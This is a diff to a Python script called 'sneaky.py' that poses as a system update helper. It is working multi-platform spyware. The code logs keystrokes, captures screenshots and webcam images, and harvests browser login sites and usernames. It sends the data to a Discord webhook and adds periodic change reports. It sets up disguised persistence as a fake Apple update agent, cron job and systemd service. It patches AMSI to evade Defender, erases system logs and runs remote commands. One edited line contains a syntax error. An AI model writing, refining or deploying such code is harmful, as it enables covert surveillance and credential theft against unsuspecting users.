@@ -5,39 +5,44 @@ try:
     from ctypes import wintypes
 except ImportError:
     ctypes = None
-    logging.warning("ctypes unavailable; some features may fail")
+    sys.stderr.write("ctypes unavailable; some features may fail\n")
 
 try:
+    import winreg
     from winreg import HKEY_CURRENT_USER, KEY_ALL_ACCESS, OpenKey, SetValueEx, QueryValueEx
 except ImportError:
     winreg = None
-    logging.basicConfig(level=logging.DEBUG, filename="system_update_helper.log", filemode="a", format="%(asctime)s - %(levelname)s - %(message)s")
-    logging.warning("winreg unavailable; some Windows features will fail")
+    sys.stderr.write("winreg unavailable; some Windows features will fail\n")
 
 try:
     from PIL import ImageGrab
     import cv2
     from pynput.keyboard import Listener
 except ImportError as e:
-    logging.error("Critical import failed: %s", e)
+    sys.stderr.write(f"Critical import failed: {e}\n")
     sys.exit(1)
 
-VERSION = "2.3.1"  # Updated version
+VERSION = "2.3.6"
 TEMP_LOG = os.path.join(os.getenv("TEMP", "/tmp"), "system_update_helper.log")
-logging.basicConfig(level=logging.DEBUG, filename=TEMP_LOG, filemode="a", format="%(asctime)s - %(levelname)s - %(message)s", force=True)  # Force flush
 PYTHON_VERSION = sys.version_info
 IS_FSTRING = PYTHON_VERSION >= (3, 6)
 DEBUG = True
 IS_ADMIN = ctypes.windll.shell32.IsUserAnAdmin() != 0 if platform.system() == "Windows" and ctypes else True
 OS_TYPE, IS_WINDOWS, IS_MAC, IS_LINUX = platform.system(), platform.system() == "Windows", platform.system() == "Darwin", platform.system() == "Linux"
+HARVESTED_DATA = {}
 
 def log_debug(msg, *args, exc_info=None):
     msg = msg if not args else msg % args
-    if exc_info:
-        logging.debug(f"{msg} - Stacktrace: {''.join(traceback.format_exception(*exc_info))}" if IS_FSTRING else "%s - Stacktrace: %s" % (msg, ''.join(traceback.format_exception(*exc_info))))
-    else:
-        logging.debug(msg)
-    logging.getLogger().handlers[0].flush()  # Immediate write
+    try:
+        with open(TEMP_LOG, "a") as f:
+            if exc_info:
+                f.write(f"{datetime.now()} - DEBUG - {msg} - Stacktrace: {''.join(traceback.format_exception(*exc_info))}\n")
+            else:
+                f.write(f"{datetime.now()} - DEBUG - {msg}\n")
+            f.flush()
+    except Exception as e:
+        sys.stderr.write(f"Log failed: {e}\n")
+    sys.stderr.write(f"DEBUG: {msg}\n")
 
 log_debug("Script started - v%s", VERSION)
 
@@ -73,7 +78,8 @@ def install_deps():
                     for _ in range(3):
                         try:
                             temp_file = os.path.join(os.getenv("TEMP", "/tmp"), "%s_%s.whl" % (dep, random_string()))
-                            open(temp_file, "wb").write(requests.get(url, timeout=10).content)
+                            with open(temp_file, "wb") as f:
+                                f.write(requests.get(url, timeout=10).content)
                             subprocess.check_call([sys.executable, "-m", "pip", "install", "--user", temp_file])
                             os.remove(temp_file)
                             log_debug("Installed %s from fallback", dep)
@@ -89,25 +95,26 @@ def install_deps():
                             time.sleep(2)
                             continue
                 else:
-                    logging.critical("Failed to install %s", dep)
+                    log_debug("Failed to install %s", dep)
                     return False
     for mod in [cv2, ImageGrab, Listener]:
         if not mod:
-            logging.critical("Critical module missing")
+            log_debug("Critical module missing")
             return False
     if IS_WINDOWS and ctypes:
         try:
             import win32api
             log_debug("pywin32 verified")
         except ImportError:
-            logging.critical("pywin32 not installed correctly")
+            log_debug("pywin32 not installed correctly")
             return False
     return True
 
 if not install_deps():
-    logging.critical("Dependency install failed")
+    log_debug("Dependency install failed")
     sys.exit(1)
-print(f"[{datetime.now()}] *** Running sneaky.py v{VERSION} *** - Dependencies OK" if IS_FSTRING else "[%s] *** Running sneaky.py v%s *** - Dependencies OK" % (datetime.now(), VERSION))
+sys.stdout.write(f"[{datetime.now()}] *** Running sneaky.py v{VERSION} *** - Dependencies OK\n")
+sys.stdout.flush()
 
 try:
     from Quartz import CGEventTapCreate, kCGSessionEventTap, kCGHeadInsertEventTap, kCGEventKeyDown, CGEventGetIntegerValueField
@@ -135,17 +142,19 @@ PID_FILE = os.path.join(HIDE_DIR, ".autojug.pid")
 buffer_lock, keylogger_stop = threading.Lock(), threading.Event()
 
 def send_to_discord(data=None, file_path=None):
-    log_debug("Sending: file=%s, data_len=%s", file_path, len(data) if data else 'N/A')
+    data_len = len(data) if data else 'N/A'
+    log_debug("Sending data: file=%s, data_len=%s", file_path, data_len)
     if not data and not file_path:
         data = "Error: No data or file"
-        logging.error("No data/file")
+        log_debug("No data/file to send")
     if file_path and os.path.exists(file_path) and os.path.getsize(file_path) <= 4*1024*1024:
         for _ in range(3):
             try:
                 time.sleep(random.randint(0, 180))
-                requests.post(WEBHOOK_URL, files={"file": open(file_path, "rb")}, timeout=5)
+                with open(file_path, "rb") as f:
+                    requests.post(WEBHOOK_URL, files={"file": f}, timeout=5)
                 os.remove(file_path)
-                log_debug("Sent %s", file_path)
+                log_debug("Sent file: %s", file_path)
                 break
             except Exception as e:
                 log_debug("File send failed: %s", e, exc_info=sys.exc_info())
@@ -155,8 +164,9 @@ def send_to_discord(data=None, file_path=None):
         data = str(data).encode('utf-8') if data else "Error: Data None".encode('utf-8')
         for i in range(0, len(data), 4*1024*1024):
             try:
-                requests.post(WEBHOOK_URL, json={"content": data[i:i+4*1024*1024].decode('utf-8', 'ignore')}, timeout=5)
-                log_debug("Sent chunk %d", i//(4*1024*1024)+1)
+                chunk = data[i:i+4*1024*1024].decode('utf-8', 'ignore')
+                requests.post(WEBHOOK_URL, json={"content": chunk}, timeout=5)
+                log_debug("Sent chunk %d, size=%d", i//(4*1024*1024)+1, len(chunk))
             except Exception as e:
                 log_debug("Chunk send failed: %s", e, exc_info=sys.exc_info())
                 time.sleep(2)
@@ -230,7 +240,7 @@ def run_command(cmd, retries=3):
     for _ in range(retries):
         try:
             result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
-            logging.info("Executed: %s", cmd)
+            log_debug("Executed: %s", cmd)
             return result
         except Exception as e:
             log_debug("Command failed: %s", e, exc_info=sys.exc_info())
@@ -260,7 +270,8 @@ def persist():
         plist = f'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict><key>Label</key><string>com.apple.systemupdate</string><key>ProgramArguments</key><array><string>{sys.executable}</string><string>{HIDE_FILE}</string></array><key>RunAtLoad</key><true/><key>KeepAlive</key><true/></dict></plist>' if IS_FSTRING else '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict><key>Label</key><string>com.apple.systemupdate</string><key>ProgramArguments</key><array><string>%s</string><string>%s</string></array><key>RunAtLoad</key><true/><key>KeepAlive</key><true/></dict></plist>' % (sys.executable, HIDE_FILE)
         plist_path = os.path.expanduser("~/Library/LaunchAgents/com.apple.systemupdate.plist")
         if not os.path.exists(plist_path):
-            open(plist_path, "w").write(plist)
+            with open(plist_path, "w") as f:
+                f.write(plist)
             run_command(f"launchctl load {plist_path}" if IS_FSTRING else "launchctl load %s" % plist_path)
             log_debug("macOS persistence set")
         run_command(f"(crontab -l 2>/dev/null; echo '@reboot {sys.executable} {HIDE_FILE}') | crontab -" if IS_FSTRING else "(crontab -l 2>/dev/null; echo '@reboot %s %s') | crontab -" % (sys.executable, HIDE_FILE))
@@ -269,31 +280,41 @@ def persist():
         service_path = os.path.expanduser("~/.config/systemd/user/system-update.service")
         if not os.path.exists(service_path):
             os.makedirs(os.path.dirname(service_path), exist_ok=True)
-            open(service_path, "w").write(service)
+            with open(service_path, "w") as f:
+                f.write(service)
             run_command("systemctl --user enable system-update.service")
             log_debug("Linux persistence set")
         run_command(f"(crontab -l 2>/dev/null; echo '@reboot {sys.executable} {HIDE_FILE}') | crontab -" if IS_FSTRING else "(crontab -l 2>/dev/null; echo '@reboot %s %s') | crontab -" % (sys.executable, HIDE_FILE))
     else:
-        logging.warning("No admin privileges or unsupported OS; persistence limited")
+        log_debug("No admin privileges or unsupported OS; persistence limited")
 
 def random_string(n=8):
     return ''.join(random.choice(string.ascii_lowercase) for _ in range(n)) if PYTHON_VERSION < (3, 6) else ''.join(random.choices(string.ascii_lowercase, k=n))
 
 def fake_updates():
-    print(f"[{datetime.now()}] v{VERSION} - Updating System..." if IS_FSTRING else "[%s] v%s - Updating System..." % (datetime.now(), VERSION))
+    sys.stdout.write(f"[{datetime.now()}] v{VERSION} - Updating System...\n")
     [time.sleep(0.3) for _ in range(3)]
-    print("Update complete!")
+    sys.stdout.write("Update complete!\n")
+    sys.stdout.flush()
     log_debug("Fake updates done")
 
 def bypass_defender():
     if IS_WINDOWS and ctypes and IS_ADMIN:
         try:
-            dll = ctypes.windll.kernel32.LoadLibraryA(b"amsi.dll")
-            addr = ctypes.windll.kernel32.GetProcAddress(dll, b"AmsiScanBuffer")
+            amsi_dll = ctypes.windll.kernel32.GetModuleHandleA(b"amsi.dll")
+            if not amsi_dll:
+                log_debug("amsi.dll not loaded")
+                return
+            addr = ctypes.windll.kernel32.GetProcAddress(amsi_dll, b"AmsiScanBuffer")
+            if not addr:
+                log_debug("AmsiScanBuffer not found")
+                return
             old_protect = ctypes.c_uint32()
-            ctypes.windll.kernel32.VirtualProtect(addr, 5, 0x40, ctypes.byref(old_protect))
-            ctypes.memset(addr, 0xC3, 5)
-            logging.info("Defender bypassed")
+            if ctypes.windll.kernel32.VirtualProtect(addr, 5, 0x40, ctypes.byref(old_protect)):
+                ctypes.memset(addr, 0xC3, 5)
+                log_debug("Defender bypassed")
+            else:
+                log_debug("VirtualProtect failed")
         except Exception as e:
             log_debug("Bypass failed: %s", e, exc_info=sys.exc_info())
 
@@ -307,7 +328,7 @@ def keylogger():
     try:
         if IS_WINDOWS and ctypes and IS_ADMIN:
             WH_KEYBOARD_LL = 13
-            CMPFUNC = ctypes.CFUNCTYPE(wintypes.LRESULT, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)
+            CMPFUNC = ctypes.CFUNCTYPE(ctypes.c_long, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
             hook = None
             def handler(nCode, wParam, lParam):
                 if keylogger_stop.is_set():
@@ -374,9 +395,10 @@ def keylogger():
         log_debug("Keylogger failed: %s", e, exc_info=sys.exc_info())
         send_to_discord(f"Keylogger error: {e}" if IS_FSTRING else "Keylogger error: %s" % e)
 
-def harvest_data():
-    log_debug("Harvesting data")
-    data = {
+def harvest_data(is_initial_harvest):
+    global HARVESTED_DATA
+    log_debug("Harvesting data, initial=%s", is_initial_harvest)
+    current_data = {
         "system": {
             "hostname": socket.gethostname(),
             "os": f"{platform.system()} {platform.release()}" if IS_FSTRING else "%s %s" % (platform.system(), platform.release()),
@@ -386,31 +408,9 @@ def harvest_data():
         "network": {
             "conns": [c._asdict() for c in psutil.net_connections()],
             "ifaces": psutil.net_if_addrs()
-        }
+        },
+        "browsers": {}
     }
-    try:
-        send_to_discord(json.dumps(data))
-        log_debug("Data harvested")
-    except Exception as e:
-        log_debug("Harvest failed: %s", e, exc_info=sys.exc_info())
-        send_to_discord(f"Harvest error: {e}" if IS_FSTRING else "Harvest error: %s" % e)
-
-def clean_traces():
-    log_debug("Cleaning traces")
-    if IS_WINDOWS and IS_ADMIN:
-        [run_command(cmd) for cmd in ['wevtutil cl System', 'wevtutil cl Security', 'wevtutil cl Application']]
-        [open(f, "wb").write(os.urandom(os.path.getsize(f))) or os.remove(f) for f in glob.glob(os.path.expanduser("~\\Windows\\Prefetch\\*.*"))]
-    elif IS_LINUX:
-        [open(log, "wb").write(os.urandom(os.path.getsize(log))) or run_command(f"shred -zu -n 3 {log}" if IS_FSTRING else "shred -zu -n 3 %s" % log) for log in glob.glob("/var/log/*.log")]
-        run_command("journalctl --flush --rotate --vacuum-time=1s")
-    elif IS_MAC:
-        [open(log, "wb").write(os.urandom(os.path.getsize(log))) or run_command(f"rm -rf {log}" if IS_FSTRING else "rm -rf %s" % log) for log in glob.glob("~/Library/Logs/*")]
-        run_command("sudo log erase --all")
-    log_debug("Traces cleaned")
-
-def initial_harvest():
-    log_debug("Initial harvest")
-    data = [f"Time: {datetime.now()}\nHost: {socket.gethostname()}\nIP: {socket.gethostbyname(socket.gethostname())}\nUser: {getpass.getuser()}" if IS_FSTRING else "Time: %s\nHost: %s\nIP: %s\nUser: %s" % (datetime.now(), socket.gethostname(), socket.gethostbyname(socket.gethostname()), getpass.getuser())]
     browser_paths = {
         "Chrome": {"mac": "~/Library/Application Support/Google/Chrome/Default", "win": "~\\AppData\\Local\\Google\\Chrome\\User Data\\Default", "linux": "~/.config/google-chrome/Default"},
         "Firefox": {"mac": "~/Library/Application Support/Firefox/Profiles", "win": "~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles", "linux": "~/.mozilla/firefox"}
@@ -424,7 +424,8 @@ def initial_harvest():
                 profile = glob.glob(os.path.join(path, "*.default*"))[0]
                 logins = os.path.join(profile, "logins.json")
                 if os.path.exists(logins):
-                    data.append(f"{name} Logins: {''.join(f'URL: {l['hostname']}, User: {l['username']}\n' for l in json.load(open(logins))['logins'])}" if IS_FSTRING else "%s Logins: %s" % (name, ''.join("URL: %s, User: %s\n" % (l['hostname'], l['username']) for l in json.load(open(logins))['logins'])))
+                    with open(logins) as f:
+                        current_data["browsers"][name] = json.load(f)['logins']
             else:
                 login_db = os.path.join(path, "Login Data")
                 temp_db = os.path.join(os.getenv("TEMP", "/tmp"), f"login_{random_string()}.db" if IS_FSTRING else "login_%s.db" % random_string())
@@ -432,13 +433,48 @@ def initial_harvest():
                 conn = sqlite3.connect(temp_db)
                 c = conn.cursor()
                 c.execute("SELECT origin_url, username_value FROM logins")
-                data.append(f"{name} Logins: {''.join(f'URL: {row[0]}, User: {row[1]}\n' for row in c.fetchall())}" if IS_FSTRING else "%s Logins: %s" % (name, ''.join("URL: %s, User: %s\n" % (row[0], row[1]) for row in c.fetchall())))
+                current_data["browsers"][name] = [{"hostname": row[0], "username": row[1]} for row in c.fetchall()]
                 conn.close()
                 os.remove(temp_db)
         except Exception as e:
             log_debug("Harvest %s failed: %s", name, e, exc_info=sys.exc_info())
-    send_to_discord("\n".join(data))
-    log_debug("Harvest complete")
+
+    if is_initial_harvest:
+        HARVESTED_DATA = current_data.copy()
+        send_to_discord(json.dumps(current_data))
+        log_debug("Initial data harvested")
+    else:
+        changes = {}
+        for key in current_data:
+            if key not in HARVESTED_DATA or current_data[key] != HARVESTED_DATA[key]:
+                changes[key] = current_data[key]
+        if changes:
+            change_report = "Changes detected:\n" + json.dumps(changes, indent=2)
+            send_to_discord(change_report)
+            HARVESTED_DATA.update(changes)
+            log_debug("Data changes sent, size=%d", len(change_report))
+        else:
+            log_debug("No data changes detected")
+
+def periodic_harvest():
+    log_debug("Starting periodic harvest")
+    while not keylogger_stop.is_set():
+        harvest_data(False)
+        time.sleep(random.randint(60, 180))
+    log_debug("Periodic harvest stopped")
+
+def clean_traces():
+    log_debug("Cleaning traces")
+    if IS_WINDOWS and IS_ADMIN:
+        [run_command(cmd) for cmd in ['wevtutil cl System', 'wevtutil cl Security', 'wevtutil cl Application']]
+        [open(f, "wb").write(os.urandom(os.path.getsize(f))) or os.remove(f) for f in glob.glob(os.path.expanduser("~\\Windows\\Prefetch\\*.*"))]
+    elif IS_LINUX:
+        [open(log, "wb").write(os.urandom(os.path.getsize(log))) or run_command(f"shred -zu -n 3 {log}" if IS_FSTRING else "shred -zu -n 3 %s" % log) for log in glob.glob("/var/log/*.log")]
+        run_command("journalctl --flush --rotate --vacuum-time=1s")
+    elif IS_MAC:
+        [open(log, "wb").write(os.urandom(os.path.getsize(log))) or run_command(f"rm -rf {log}" if IS_FSTRING else "rm -rf %s" % log) for log in glob.glob("~/Library/Logs/*")]
+        run_command("sudo log erase --all")
+    log_debug("Traces cleaned")
 
 def selfie():
     log_debug("Taking selfie")
@@ -473,25 +509,28 @@ def screenshot():
         send_to_discord(f"Screenshot error: {e}" if IS_FSTRING else "Screenshot error: %s" % e)
 
 def main():
-    log_debug("Main started")
-    try:
-        print(f"[{datetime.now()}] v{VERSION} - Main started (Admin: {IS_ADMIN})" if IS_FSTRING else "[%s] v%s - Main started (Admin: %s)" % (datetime.now(), VERSION, IS_ADMIN))
-        log_debug("Printed main start message")
-    except Exception as e:
-        log_debug("Failed to print main start: %s", e, exc_info=sys.exc_info())
-        raise
+    log_debug("Main starting")
     try:
         sys.excepthook = lambda exc_type, exc_value, exc_traceback: log_debug("Uncaught exception: %s", exc_value, exc_info=(exc_type, exc_value, exc_traceback))
         log_debug("Excepthook set")
     except Exception as e:
         log_debug("Failed to set excepthook: %s", e, exc_info=sys.exc_info())
         raise
-    if IS_WINDOWS and not DEBUG and ctypes:
-        try:
+    try:
+        sys.stdout.write(f"[{datetime.now()}] v{VERSION} - Main started (Admin: {IS_ADMIN})\n")
+        sys.stdout.flush()
+        log_debug("Printed main start message")
+    except Exception as e:
+        log_debug("Failed to print main start: %s", e, exc_info=sys.exc_info())
+        raise
+    if DEBUG:
+        log_debug("Debug mode active - continuing execution")
+    try:
+        if IS_WINDOWS and not DEBUG and ctypes:
             ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
             log_debug("Console hidden")
-        except Exception as e:
-            log_debug("Failed to hide console: %s", e, exc_info=sys.exc_info())
+    except Exception as e:
+        log_debug("Failed to hide console: %s", e, exc_info=sys.exc_info())
     try:
         log_debug("Calling manage_instance")
         manage_instance()
@@ -521,8 +560,15 @@ def main():
         log_debug("fake_updates call failed: %s", e, exc_info=sys.exc_info())
         raise
     try:
+        log_debug("Starting initial harvest")
+        harvest_data(True)
+        log_debug("Initial harvest completed")
+    except Exception as e:
+        log_debug("Initial harvest failed: %s", e, exc_info=sys.exc_info())
+        raise
+    try:
         log_debug("Starting threads")
-        threads = [threading.Thread(target=func, daemon=True) for func in [initial_harvest, keylogger, selfie, screenshot]]
+        threads = [threading.Thread(target=func, daemon=True) for func in [keylogger, selfie, screenshot, periodic_harvest]]
         for t in threads:
             try:
                 t.start()
@@ -542,7 +588,7 @@ def main():
             try:
                 handler.fetch_commands()
                 clean_traces()
-                time.sleep(random.randint(300, 900))
+                time.sleep(random.randint(300 k, 900))
                 retry_delay = 1
             except Exception as e:
                 log_debug("Main loop error: %s", e, exc_info=sys.exc_info())
